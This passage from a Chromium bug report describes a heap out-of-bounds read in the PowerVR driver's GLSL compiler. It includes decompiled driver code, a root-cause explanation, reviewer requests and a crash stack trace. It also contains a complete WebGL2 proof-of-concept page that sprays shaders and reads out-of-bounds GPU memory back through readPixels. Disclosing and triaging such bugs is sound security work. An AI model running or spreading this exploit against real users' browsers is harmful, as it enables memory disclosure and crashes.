          pSVar29 = *(StructType **)(*(long *)(*(long *)(lVar3 + 0x40) + 0x10) + uVar25 * 8);
          puVar23 = __src;
          if ((pSVar29 == (StructType *)0x0) || ((*(uint *)(pSVar29 + 8) & 0x4ff) != 0x10)) {
LAB_00e38bc0:
            plVar19 = *(long **)(lVar3 + 0x10);
            plVar16 = (long *)*plVar19;
            plVar11 = plVar19;
            if (plVar16 != (long *)0x0) {
              do {
                if (*(uint *)(plVar16 + 4) >= param_1) {
                  plVar11 = plVar16;
                }
                plVar16 = (long *)plVar16[*(uint *)(plVar16 + 4) < param_1];
              } while (plVar16 != (long *)0x0);
              if ((plVar11 != plVar19) && (*(uint *)(plVar11 + 4) <= param_1)) {
                plVar19 = plVar11;
              }
            }
            lVar17 = plVar19[5];
            *(ulong *)(lVar3 + 0x38) = uVar22;
            p_Var33 = *(__tree_node_base **)(lVar3 + 0x30);
            uVar24 = *(uint *)(lVar17 + uVar22 * 8);
            p_Var12 = *(__tree_node_base **)(lVar3 + 0x78);
            while (p_Var21 = p_Var33, p_Var12 != (__tree_node_base *)0x0) {
              while (p_Var33 = p_Var12, *(uint *)(p_Var33 + 0x20) <= uVar24) {
                if (uVar24 <= *(uint *)(p_Var33 + 0x20)) goto LAB_00e38ca4;
                p_Var12 = *(__tree_node_base **)(p_Var33 + 8);
                if (*(__tree_node_base **)(p_Var33 + 8) == (__tree_node_base *)0x0) {
                  p_Var21 = p_Var33 + 8;
                  goto LAB_00e38c50;
                }
              }
              p_Var12 = *(__tree_node_base **)p_Var33;
            }
LAB_00e38c50:
            *(__tree_node_base **)(lVar3 + 0x28) = p_Var33;
            p_Var33 = operator.new(0x30);
            uVar6 = *(undefined8 *)(lVar3 + 0x28);
            *(uint *)(p_Var33 + 0x20) = uVar24;
            *(undefined8 *)(p_Var33 + 0x28) = 0;
            *(undefined8 *)p_Var33 = 0;
            *(undefined8 *)(p_Var33 + 8) = 0;
            *(undefined8 *)(p_Var33 + 0x10) = uVar6;
            *(__tree_node_base **)p_Var21 = p_Var33;
            p_Var12 = p_Var33;
            if (**(long **)(lVar3 + 0x70) != 0) {
              *(long *)(lVar3 + 0x70) = **(long **)(lVar3 + 0x70);
              p_Var12 = *(__tree_node_base **)p_Var21;
            }
            std::__tree_balance_after_insert[abi:nn210000]<>
                      (*(__tree_node_base **)(lVar3 + 0x78),p_Var12);
            *(long *)(lVar3 + 0x80) = *(long *)(lVar3 + 0x80) + 1;
LAB_00e38ca4:
            puVar13 = *(uint **)(lVar3 + 0x48);
            *(StructType **)(p_Var33 + 0x28) = pSVar29;
            if (puVar20 < puVar13) {
              *puVar20 = uVar24;
            }
            else {
              sVar34 = (long)puVar20 - (long)__src;
              uVar32 = ((long)sVar34 >> 2) + 1;
              if (uVar32 >> 0x3e != 0) {
LAB_00e3980c:
                    /* WARNING: Subroutine does not return */
                std::vector<>::__throw_length_error[abi:nn210000]();
              }
              *(long *)(lVar3 + 0x28) = (long)sVar34 >> 2;
              uVar30 = *(long *)(lVar3 + 0x48) - (long)__src;
              uVar22 = (long)uVar30 >> 1;
              if ((ulong)((long)uVar30 >> 1) <= uVar32) {
                uVar22 = uVar32;
              }
              if (0x7ffffffffffffffb < uVar30) {
                uVar22 = 0x3fffffffffffffff;
              }
              if (uVar22 >> 0x3e != 0) {
LAB_00e39810:
                    /* WARNING: Subroutine does not return */
                std::__throw_bad_array_new_length[abi:nn210000]();
              }
              pvVar7 = operator.new(uVar22 * 4);
              puVar20 = (uint *)((long)pvVar7 + sVar34);
              *(void **)(lVar3 + 0x48) = (void *)((long)pvVar7 + uVar22 * 4);
              puVar23 = puVar20 + -*(long *)(lVar3 + 0x28);
              *puVar20 = uVar24;
              memcpy(puVar23,__src,sVar34);
              if (__src != (uint *)0x0) {
                operator.delete(__src,uVar30);
              }
            }
            puVar13 = puVar20 + 1;
            uVar32 = *(ulong *)(lVar3 + 0x18);
            uVar22 = (ulong)((int)*(undefined8 *)(lVar3 + 0x38) + 1);
          }
          else {
            auVar38 = llvm::StructType::getName(pSVar29);
            if ((auVar38._8_8_ < 2) || (*auVar38._0_8_ != 0x6470)) goto LAB_00e38bc0;
            if (puVar20 < *(uint **)(lVar3 + 0x48)) {
              puVar13 = puVar20 + 1;
              *puVar20 = 0xffffffff;
            }
            else {
              sVar34 = (long)puVar20 - (long)__src;
              uVar32 = ((long)sVar34 >> 2) + 1;
              if (uVar32 >> 0x3e != 0) goto LAB_00e3980c;
              *(long *)(lVar3 + 0x38) = (long)sVar34 >> 2;
              uVar31 = *(long *)(lVar3 + 0x48) - (long)__src;
              uVar30 = (long)uVar31 >> 1;
              if ((ulong)((long)uVar31 >> 1) <= uVar32) {
                uVar30 = uVar32;
              }
              if (0x7ffffffffffffffb < uVar31) {
                uVar30 = 0x3fffffffffffffff;
              }
              if (uVar30 >> 0x3e != 0) goto LAB_00e39810;
              pvVar7 = operator.new(uVar30 * 4);
              puVar1 = (undefined4 *)((long)pvVar7 + sVar34);
              *(void **)(lVar3 + 0x48) = (void *)((long)pvVar7 + uVar30 * 4);
              puVar23 = puVar1 + -*(long *)(lVar3 + 0x38);
              puVar13 = puVar1 + 1;
              *puVar1 = 0xffffffff;
              memcpy(puVar23,__src,sVar34);
              if (__src != (uint *)0x0) {
                operator.delete(__src,uVar31);
              }
              uVar32 = *(ulong *)(lVar3 + 0x18);
            }
          }
          uVar25 = uVar25 + 1;
          puVar20 = puVar13;
          __src = puVar23;
        } while (uVar25 != uVar32);
        if (*(long *)(lVar3 + 0x80) != 0) {
          uVar32 = 0;
          uVar24 = 0;
LAB_00e38fc8:
          p_Var33 = *(__tree_node_base **)(lVar3 + 0x78);
          p_Var12 = *(__tree_node_base **)(lVar3 + 0x30);
          while (p_Var21 = p_Var12, p_Var33 != (__tree_node_base *)0x0) {
            while (p_Var8 = p_Var33, *(uint *)(p_Var8 + 0x20) <= uVar24) {
              if (uVar24 <= *(uint *)(p_Var8 + 0x20)) goto LAB_00e39054;
              p_Var33 = *(__tree_node_base **)(p_Var8 + 8);
              if (*(__tree_node_base **)(p_Var8 + 8) == (__tree_node_base *)0x0) {
                p_Var12 = p_Var8 + 8;
                p_Var21 = p_Var8;
                goto LAB_00e39004;
              }
            }
            p_Var12 = p_Var8;
            p_Var33 = *(__tree_node_base **)p_Var8;
          }
LAB_00e39004:
          p_Var8 = operator.new(0x30);
          *(uint *)(p_Var8 + 0x20) = uVar24;
          *(undefined8 *)(p_Var8 + 0x28) = 0;
          *(undefined8 *)p_Var8 = 0;
          *(undefined8 *)(p_Var8 + 8) = 0;
          *(__tree_node_base **)(p_Var8 + 0x10) = p_Var21;
          *(__tree_node_base **)p_Var12 = p_Var8;
          p_Var33 = p_Var8;
          if (**(long **)(lVar3 + 0x70) != 0) {
            *(long *)(lVar3 + 0x70) = **(long **)(lVar3 + 0x70);
            p_Var33 = *(__tree_node_base **)p_Var12;
          }
          std::__tree_balance_after_insert[abi:nn210000]<>
                    (*(__tree_node_base **)(lVar3 + 0x78),p_Var33);
          *(long *)(lVar3 + 0x80) = *(long *)(lVar3 + 0x80) + 1;
LAB_00e39054:
          pTVar35 = *(Type **)(p_Var8 + 0x28);
          lVar17 = GetSymbolTableDatafn
                             (*(undefined8 *)(this + 0x30),*(undefined8 *)(this + 0x48),param_1,0,0,
                              "vendor/imgtec/powervr/compiler/oglcompiler/llvm/llvm_glsltypes.cpp",
                              0x850);
          lVar17 = *(long *)(lVar17 + 0x10) + uVar32 * 0x100;
          uVar26 = (uint)uVar27;
          if (pTVar35[8] == (Type)0x10) {
            uVar6 = GetConstantByType(this,*(uint *)(lVar17 + 0x38),pTVar35,*(void **)(lVar3 + 0x50)
                                      ,uVar26,*(int *)(lVar17 + 0x30) - 0x12U < 4);
            p_Var33 = *(__tree_node_base **)(lVar3 + 0x20);
            p_Var12 = *(__tree_node_base **)(lVar3 + 0x60);
            while (p_Var21 = p_Var33, p_Var8 = p_Var33, p_Var12 != (__tree_node_base *)0x0) {
              while (p_Var33 = p_Var12, *(uint *)(p_Var33 + 0x20) <= uVar24) {
                if (uVar24 <= *(uint *)(p_Var33 + 0x20)) goto LAB_00e38fa4;
                p_Var12 = *(__tree_node_base **)(p_Var33 + 8);
                if (*(__tree_node_base **)(p_Var33 + 8) == (__tree_node_base *)0x0)
                goto LAB_00e3915c;
              }
              p_Var12 = *(__tree_node_base **)p_Var33;
            }
          }
          else {
            uVar6 = GetConstantByType(this,param_1,pTVar35,*(void **)(lVar3 + 0x50),uVar26,
                                      *(int *)(lVar17 + 0x30) - 0x12U < 4);
            p_Var33 = *(__tree_node_base **)(lVar3 + 0x20);
            p_Var12 = *(__tree_node_base **)(lVar3 + 0x60);
            while (p_Var21 = p_Var33, p_Var8 = p_Var33, p_Var12 != (__tree_node_base *)0x0) {
              while (p_Var33 = p_Var12, *(uint *)(p_Var33 + 0x20) <= uVar24) {
                if (uVar24 <= *(uint *)(p_Var33 + 0x20)) goto LAB_00e38fa4;
                p_Var12 = *(__tree_node_base **)(p_Var33 + 8);
                if (*(__tree_node_base **)(p_Var33 + 8) == (__tree_node_base *)0x0)
                goto LAB_00e3915c;
              }
              p_Var12 = *(__tree_node_base **)p_Var33;
            }
          }
          goto LAB_00e39160;
        }
LAB_00e391a0:
        lVar17 = 0;
        lVar28 = *(long *)(lVar3 + 0x18);
        do {
          uVar24 = puVar23[lVar17];
          if (uVar24 == 0xffffffff) {
            uVar6 = llvm::UndefValue::get
                              (*(Type **)(*(long *)(*(long *)(lVar3 + 0x40) + 0x10) + lVar17 * 8));
            uVar27 = (ulong)*(uint *)(lVar3 + 0x108);
            if (*(uint *)(lVar3 + 0x10c) <= uVar27) goto LAB_00e392b0;
          }
          else {
            p_Var33 = *(__tree_node_base **)(lVar3 + 0x20);
            p_Var12 = *(__tree_node_base **)(lVar3 + 0x60);
            while (p_Var8 = p_Var33, p_Var21 = p_Var33, p_Var12 != (__tree_node_base *)0x0) {
              while (p_Var33 = p_Var12, *(uint *)(p_Var33 + 0x20) <= uVar24) {
                if (uVar24 <= *(uint *)(p_Var33 + 0x20)) goto LAB_00e39250;
                p_Var12 = *(__tree_node_base **)(p_Var33 + 8);
                if (*(__tree_node_base **)(p_Var33 + 8) == (__tree_node_base *)0x0) {
                  p_Var21 = p_Var33 + 8;
                  p_Var8 = p_Var33;
                  goto LAB_00e39200;
                }
              }
              p_Var12 = *(__tree_node_base **)p_Var33;
            }
LAB_00e39200:
            p_Var33 = operator.new(0x30);
            *(uint *)(p_Var33 + 0x20) = uVar24;
            *(undefined8 *)(p_Var33 + 0x28) = 0;
            *(undefined8 *)p_Var33 = 0;
            *(undefined8 *)(p_Var33 + 8) = 0;
            *(__tree_node_base **)(p_Var33 + 0x10) = p_Var8;
            *(__tree_node_base **)p_Var21 = p_Var33;
            p_Var12 = p_Var33;
            if (**(long **)(lVar3 + 0x58) != 0) {
              *(long *)(lVar3 + 0x58) = **(long **)(lVar3 + 0x58);
              p_Var12 = *(__tree_node_base **)p_Var21;
            }
            std::__tree_balance_after_insert[abi:nn210000]<>
                      (*(__tree_node_base **)(lVar3 + 0x60),p_Var12);
            *(long *)(lVar3 + 0x68) = *(long *)(lVar3 + 0x68) + 1;
LAB_00e39250:
            uVar27 = (ulong)*(uint *)(lVar3 + 0x108);
            uVar6 = *(undefined8 *)(p_Var33 + 0x28);
            if (*(uint *)(lVar3 + 0x10c) <= uVar27) {
LAB_00e392b0:
              llvm::SmallVectorBase<>::grow_pod
                        ((SmallVectorBase<> *)(lVar3 + 0x100),*(void **)(lVar3 + 8),uVar27 + 1,8);
              uVar27 = (ulong)*(uint *)(lVar3 + 0x108);
            }
          }
          lVar17 = lVar17 + 1;
          *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar27 * 8) = uVar6;
          *(int *)(lVar3 + 0x108) = *(int *)(lVar3 + 0x108) + 1;
        } while (lVar17 != lVar28);
        if (puVar23 != (uint *)0x0) {
          operator.delete(puVar23,*(long *)(lVar3 + 0x48) - (long)puVar23);
        }
      }
      std::__tree<>::destroy(*(__tree_node **)(lVar3 + 0x60));
      std::__tree<>::destroy(*(__tree_node **)(lVar3 + 0x78));
      param_2 = *(Type **)(lVar3 + 0x40);
    }
    uVar6 = llvm::ConstantStruct::get
                      ((ConstantStruct *)param_2,*(undefined8 *)(lVar3 + 0x100),
                       *(undefined4 *)(lVar3 + 0x108));
    pCVar14 = *(ConstantVector **)(lVar3 + 0x100);
    pCVar18 = *(ConstantVector **)(lVar3 + 8);
LAB_00e397c8:
    if (pCVar14 == pCVar18) goto LAB_00e397e0;
  }
  else {
    if (TVar2 == (Type)0x11) {
LAB_00e394f0:
      *(undefined8 *)(lVar3 + 0x118) = 0;
      *(undefined8 *)(lVar3 + 0x110) = 0;
      *(undefined8 *)(lVar3 + 0x128) = 0;
      *(undefined8 *)(lVar3 + 0x120) = 0;
      *(undefined8 *)(lVar3 + 0x138) = 0;
      *(undefined8 *)(lVar3 + 0x130) = 0;
      *(undefined8 *)(lVar3 + 0x148) = 0;
      *(undefined8 *)(lVar3 + 0x140) = 0;
      *(undefined8 *)(lVar3 + 0x158) = 0;
      *(undefined8 *)(lVar3 + 0x150) = 0;
      *(undefined8 *)(lVar3 + 0x168) = 0;
      *(undefined8 *)(lVar3 + 0x160) = 0;
      *(undefined8 *)(lVar3 + 0x178) = 0;
      *(undefined8 *)(lVar3 + 0x170) = 0;
      *(undefined8 *)(lVar3 + 0x188) = 0;
      *(undefined8 *)(lVar3 + 0x180) = 0;
      auVar37 = SVE_index(ZEXT1632(ZEXT816(0)),0,0x10);
      puVar15 = *(undefined8 **)(param_2 + 0x10);
      *(long *)(lVar3 + 0x100) = lVar3 + 0x110;
      *(long *)(lVar3 + 0x108) = auVar37._0_8_;
      *(long *)(lVar3 + 0x30) = lVar3 + 0x110;
      SVE_str(auVar37,&stack0xffffffffffffffa0,0xffff);
      pTVar35 = (Type *)*puVar15;
      uVar5 = (anonymous_namespace)::GetNumberOfElementsInTypeWithoutPadding(pTVar35);
      lVar17 = *(long *)(param_2 + 0x20);
      *(undefined4 *)(lVar3 + 0x38) = uVar5;
      if (lVar17 != 0) {
        uVar32 = 0;
        puVar15 = (undefined8 *)(lVar3 + 0x80);
        *(Type **)(lVar3 + 0x40) = param_2;
        do {
          if (pTVar35[8] == (Type)0x10) {
            *(undefined8 **)(lVar3 + 0x70) = puVar15;
            *(undefined8 *)(lVar3 + 0x88) = 0;
            *puVar15 = 0;
            *(undefined8 *)(lVar3 + 0x98) = 0;
            *(undefined8 *)(lVar3 + 0x90) = 0;
            *(undefined8 *)(lVar3 + 0xa8) = 0;
            *(undefined8 *)(lVar3 + 0xa0) = 0;
            *(undefined8 *)(lVar3 + 0xb8) = 0;
            *(undefined8 *)(lVar3 + 0xb0) = 0;
            *(undefined8 *)(lVar3 + 200) = 0;
            *(undefined8 *)(lVar3 + 0xc0) = 0;
            *(undefined8 *)(lVar3 + 0xd8) = 0;
            *(undefined8 *)(lVar3 + 0xd0) = 0;
            *(undefined8 *)(lVar3 + 0xe8) = 0;
            *(undefined8 *)(lVar3 + 0xe0) = 0;
            *(undefined8 *)(lVar3 + 0xf8) = 0;
            *(undefined8 *)(lVar3 + 0xf0) = 0;
            auVar37 = SVE_ldr(ZEXT1632(ZEXT816(0)),&stack0xffffffffffffffa0,0xffff);
            *(long *)(lVar3 + 0x78) = auVar37._0_8_;
            uVar24 = *(uint *)(pTVar35 + 0xc);
            if (uVar24 == 0) {
              uVar5 = 0;
              puVar10 = puVar15;
            }
            else {
              *(ulong *)(lVar3 + 0x48) = uVar32;
              lVar17 = 0;
              do {
                pSVar29 = *(StructType **)(*(long *)(pTVar35 + 0x10) + lVar17);
                if ((pSVar29 == (StructType *)0x0) || ((*(uint *)(pSVar29 + 8) & 0x4ff) != 0x10)) {
LAB_00e39630:
                  uVar6 = GetConstantByType(this,param_1,(Type *)pSVar29,*(void **)(lVar3 + 0x50),
                                            (uint)uVar27,param_5);
                  uVar32 = (ulong)*(uint *)(lVar3 + 0x78);
                  if (*(uint *)(lVar3 + 0x7c) <= uVar32) {
                    llvm::SmallVectorBase<>::grow_pod
                              ((SmallVectorBase<> *)(lVar3 + 0x70),puVar15,uVar32 + 1,8);
                    uVar32 = (ulong)*(uint *)(lVar3 + 0x78);
                  }
                  *(undefined8 *)(*(long *)(lVar3 + 0x70) + uVar32 * 8) = uVar6;
                  *(int *)(lVar3 + 0x78) = *(int *)(lVar3 + 0x78) + 1;
                  iVar4 = (anonymous_namespace)::GetNumberOfElementsInTypeWithoutPadding
                                    ((Type *)pSVar29);
                  uVar27 = (ulong)(iVar4 + (uint)uVar27);
                }
                else {
                  auVar38 = llvm::StructType::getName(pSVar29);
                  if ((auVar38._8_8_ < 2) || (*auVar38._0_8_ != 0x6470)) goto LAB_00e39630;
                  uVar6 = llvm::UndefValue::get((Type *)pSVar29);
                  uVar32 = (ulong)*(uint *)(lVar3 + 0x78);
                  if (*(uint *)(lVar3 + 0x7c) <= uVar32) {
                    llvm::SmallVectorBase<>::grow_pod
                              ((SmallVectorBase<> *)(lVar3 + 0x70),puVar15,uVar32 + 1,8);
                    uVar32 = (ulong)*(uint *)(lVar3 + 0x78);
                  }
                  *(undefined8 *)(*(long *)(lVar3 + 0x70) + uVar32 * 8) = uVar6;
                  *(int *)(lVar3 + 0x78) = *(int *)(lVar3 + 0x78) + 1;
                }
                lVar17 = lVar17 + 8;
              } while ((ulong)uVar24 * 8 - lVar17 != 0);
              param_2 = *(Type **)(lVar3 + 0x40);
              uVar32 = *(ulong *)(lVar3 + 0x48);
              uVar5 = *(undefined4 *)(lVar3 + 0x78);
              puVar10 = *(undefined8 **)(lVar3 + 0x70);
            }
            iVar4 = (int)uVar32;
            uVar6 = llvm::ConstantStruct::get((ConstantStruct *)pTVar35,puVar10,uVar5);
            uVar32 = (ulong)*(uint *)(lVar3 + 0x108);
            if (*(uint *)(lVar3 + 0x10c) <= uVar32) {
              llvm::SmallVectorBase<>::grow_pod
                        ((SmallVectorBase<> *)(lVar3 + 0x100),*(void **)(lVar3 + 0x30),uVar32 + 1,8)
              ;
              uVar32 = (ulong)*(uint *)(lVar3 + 0x108);
            }
            *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar32 * 8) = uVar6;
            *(int *)(lVar3 + 0x108) = *(int *)(lVar3 + 0x108) + 1;
            if (*(undefined8 **)(lVar3 + 0x70) != puVar15) {
              free(*(undefined8 **)(lVar3 + 0x70));
            }
          }
          else {
            uVar6 = GetConstantByType(this,param_1,pTVar35,*(void **)(lVar3 + 0x50),(uint)uVar27,
                                      param_5);
            uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            if (*(uint *)(lVar3 + 0x10c) <= uVar25) {
              llvm::SmallVectorBase<>::grow_pod
                        ((SmallVectorBase<> *)(lVar3 + 0x100),*(void **)(lVar3 + 0x30),uVar25 + 1,8)
              ;
              uVar25 = (ulong)*(uint *)(lVar3 + 0x108);
            }
            iVar4 = (int)uVar32;
            *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar25 * 8) = uVar6;
            uVar27 = (ulong)((uint)uVar27 + *(int *)(lVar3 + 0x38));
            *(int *)(lVar3 + 0x108) = *(int *)(lVar3 + 0x108) + 1;
          }
          uVar32 = (ulong)(iVar4 + 1);
        } while (uVar32 < *(ulong *)(param_2 + 0x20));
      }
      uVar6 = llvm::ConstantArray::get
                        ((ConstantArray *)param_2,*(undefined8 *)(lVar3 + 0x100),
                         *(undefined4 *)(lVar3 + 0x108));
      pCVar14 = *(ConstantVector **)(lVar3 + 0x100);
      pCVar18 = *(ConstantVector **)(lVar3 + 0x30);
      goto LAB_00e397c8;
    }
    if (TVar2 != (Type)0x12) goto LAB_00e397e0;
LAB_00e38ec8:
    pCVar18 = (ConstantVector *)(lVar3 + 0x110);
    *(undefined8 *)(lVar3 + 0x118) = 0;
    *(undefined8 *)(lVar3 + 0x110) = 0;
    *(undefined8 *)(lVar3 + 0x128) = 0;
    *(undefined8 *)(lVar3 + 0x120) = 0;
    auVar37 = SVE_index(ZEXT1632(ZEXT816(0)),0,4);
    iVar4 = *(int *)(param_2 + 0x20);
    *(ConstantVector **)(lVar3 + 0x100) = pCVar18;
    *(long *)(lVar3 + 0x108) = auVar37._0_8_;
    if (iVar4 == 0) {
      iVar9 = 0;
      pCVar14 = pCVar18;
    }
    else {
      pTVar35 = *(Type **)(param_2 + 0x18);
      do {
        uVar6 = GetConstantByType(this,param_1,pTVar35,*(void **)(lVar3 + 0x50),(uint)uVar27,param_5
                                 );
        uVar32 = (ulong)*(uint *)(lVar3 + 0x108);
        if (*(uint *)(lVar3 + 0x10c) <= uVar32) {
          llvm::SmallVectorBase<>::grow_pod
                    ((SmallVectorBase<> *)(lVar3 + 0x100),pCVar18,uVar32 + 1,8);
          uVar32 = (ulong)*(uint *)(lVar3 + 0x108);
        }
        iVar4 = iVar4 + -1;
        uVar27 = (ulong)((uint)uVar27 + 1);
        *(undefined8 *)(*(long *)(lVar3 + 0x100) + uVar32 * 8) = uVar6;
        iVar9 = *(int *)(lVar3 + 0x108) + 1;
        *(int *)(lVar3 + 0x108) = iVar9;
      } while (iVar4 != 0);
      pCVar14 = *(ConstantVector **)(lVar3 + 0x100);
    }
    uVar6 = llvm::ConstantVector::get(pCVar14,iVar9);
    pCVar14 = *(ConstantVector **)(lVar3 + 0x100);
    if (pCVar14 == pCVar18) goto LAB_00e397e0;
  }
  free(pCVar14);
LAB_00e397e0:
  SVE_addvl(lVar3,lVar3,1);
  return uVar6;
LAB_00e3915c:
  p_Var21 = p_Var33;
  p_Var8 = p_Var33 + 8;
LAB_00e39160:
  p_Var33 = operator.new(0x30);
  *(uint *)(p_Var33 + 0x20) = uVar24;
  *(undefined8 *)(p_Var33 + 0x28) = 0;
  *(undefined8 *)p_Var33 = 0;
  *(undefined8 *)(p_Var33 + 8) = 0;
  *(__tree_node_base **)(p_Var33 + 0x10) = p_Var21;
  *(__tree_node_base **)p_Var8 = p_Var33;
  p_Var12 = p_Var33;
  if (**(long **)(lVar3 + 0x58) != 0) {
    *(long *)(lVar3 + 0x58) = **(long **)(lVar3 + 0x58);
    p_Var12 = *(__tree_node_base **)p_Var8;
  }
  std::__tree_balance_after_insert[abi:nn210000]<>(*(__tree_node_base **)(lVar3 + 0x60),p_Var12);
  *(long *)(lVar3 + 0x68) = *(long *)(lVar3 + 0x68) + 1;
LAB_00e38fa4:
  *(undefined8 *)(p_Var33 + 0x28) = uVar6;
  iVar4 = (anonymous_namespace)::GetNumberOfElementsInTypeWithoutPadding(pTVar35);
  uVar24 = uVar24 + 1;
  uVar32 = (ulong)uVar24;
  uVar27 = (ulong)(iVar4 + uVar26);
  if (*(ulong *)(lVar3 + 0x80) <= uVar32) goto LAB_00e391a0;
  goto LAB_00e38fc8;
}



```

Crash Location
The crash is triggered directly at the memory read instructions used to extract base types (integers, floats, doubles) inside glsl::glslTypeGen::GetConstantByType. Specifically:

\*(int \*)(buffer\_base + offset \* 4)

\*(float \*)(buffer\_base + offset \* 4)

\*(double \*)(buffer\_base + offset \* 8)

Root Cause
The fundamental issue is a Heap Out-of-Bounds (OOB) Read caused by the absence of boundary validation during the parsing of nested constant structures.

1.Unbounded Offset Accumulation: When Chrome's ANGLE engine translates and passes a complex WebGL shader down to the PowerVR driver, the driver's GLSL compiler recursively parses nested types (like deep structs or arrays). It extracts the element count (GetNumberOfElementsInTypeWithoutPadding) and blindly adds it to the read offset.

2.Missing Bounds Validation: At no point does the execution path verify if the accumulated offset (offset \* 4 or offset

### ha...@gmail.com (2026-02-22)

```
<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0;">
    <canvas id="gl" width="1" height="1"></canvas>
    <div id="log" style="font-family: monospace;">>>> PoC</div>

    <script>
        const log = (msg) => document.getElementById('log').textContent += msg + "\n";

        async function exploit() {
            const gl = document.getElementById('gl').getContext('webgl2');
            if (!gl) return;

          
            const junkShaders = [];
            for (let i = 0; i < 300; i++) {
                const s = gl.createShader(gl.FRAGMENT_SHADER);

                let paddingSource = `precision highp float;\n/* ${"X".repeat(512)} */\n`;
                for(let j=0; j<20; j++) {
                    paddingSource += `float var_${i}_${j} = ${j}.5;\n`;
                }
                paddingSource += "void main() { gl_FragColor = vec4(1.0); }";
                
                gl.shaderSource(s, paddingSource);
                gl.compileShader(s);
                junkShaders.push(s);
            }

            const vsSource = `#version 300 es
                void main() { gl_Position = vec4(0,0,0,1); }`;

            const fsSource = `#version 300 es
precision highp float;

struct S { vec4 v[16]; };
struct T { S s[4]; };
struct U { T t[4]; };

const S s_val = S(vec4[16](vec4(1.1),vec4(1.2),vec4(1.3),vec4(1.4),vec4(1.5),vec4(1.6),vec4(1.7),vec4(1.8),vec4(1.9),vec4(2.0),vec4(2.1),vec4(2.2),vec4(2.3),vec4(2.4),vec4(2.5),vec4(2.6)));
const T t_val = T(S[4](s_val, s_val, s_val, s_val));
const U leak_source = U(T[4](t_val, t_val, t_val, t_val));

uniform int u_off;
out vec4 color;

int opaque_offset(int base, int dynamic_val) {
    int noise = (dynamic_val ^ (dynamic_val << 1)) & 0; 
    return base + dynamic_val + noise;
}

void main() {
 
    int indices[3] = int[3](
        2 + (u_off & 0),                                
        int(min(float(u_off), float(u_off))) * 0 + 3,   
        opaque_offset(-1, u_off)                  
    );

    vec4 leaked_data = vec4(0.0);

    switch (u_off * 0) { 
        case 0:
   
            leaked_data = leak_source.t[indices[0]].s[indices[1]].v[indices[2]];
            break;
        case 1:
            leaked_data = leak_source.t[0].s[0].v[0];
            break;
    }

    color = leaked_data + float(u_off % 2) * 0.000001;
}`;

            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, vsSource);
            gl.compileShader(vs);

            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, fsSource);
            gl.compileShader(fs);

            const prog = gl.createProgram();
            gl.attachShader(prog, vs);
            gl.attachShader(prog, fs);
            gl.linkProgram(prog);
            gl.useProgram(prog);

            const offLoc = gl.getUniformLocation(prog, "u_off");

            
            for (let o = 1; o <= 4; o++) {
                gl.uniform1i(offLoc, o);
                gl.drawArrays(gl.POINTS, 0, 1);
                
                const pixels = new Float32Array(4);
                gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.FLOAT, pixels);
                const u32 = new Uint32Array(pixels.buffer);
                
                let out = `Offset ${o}: `;
                let leaked = false;
                for(let i=0; i<4; i++) {
                    const hex = u32[i].toString(16).toUpperCase().padStart(8, '0');
                    if(u32[i] !== 0 && u32[i] !== 0x3F800000) leaked = true;
                    out += `0x${hex} `;
                }
                log(out + (leaked ? " << [!]" : ""));
            }
        }

        window.onload = exploit;
    </script>
</body>
</html>

```

This can cause crashes with the same root cause but different paths.

### an...@chromium.org (2026-02-22)

chuvakin@, can you PTAL? Is this a duplicate of <https://issues.chromium.org/425459792>?

### aj...@google.com (2026-02-26)

Hello - please upload pocs as attachments and for source files provide snippets rather complete output it's not very easy for us to read!

### aj...@google.com (2026-02-26)

Please also provide a symbolized chrome stack to help with triage!

### ha...@gmail.com (2026-02-27)

The initial stack is not required because it's a GPU issue, but since you requested it, I have provided it.

```
signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x76c83a6e40 in tid 15168 (CrGpuMain), pid 15148 (ileged_process0)
Build fingerprint: 'google/frankel/frankel:16/BP4A.260205.001/14624666:user/release-keys'
Revision: 'MP1.0'
pid: 15148, tid: 15168, name: CrGpuMain  >>> org.chromium.chrome:privileged_process0 <<<
signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x00000076c83a6e40 (read)

Stack Trace:
  RELADDR   FUNCTION                                                                          FILE:LINE
  0000000000d394b0  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+2624) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d38f0c  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1180) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d39648  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d39118  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1704) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d39648  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d39118  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+1704) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d39648  glsl::glslTypeGen::GetConstantByType(unsigned int, llvm::Type*, void const*, unsigned int, bool)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d0d99c  glsl::glslValue::GetLLVMValueRefFromNode(unsigned int, bool)+268) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05c44  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2948) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
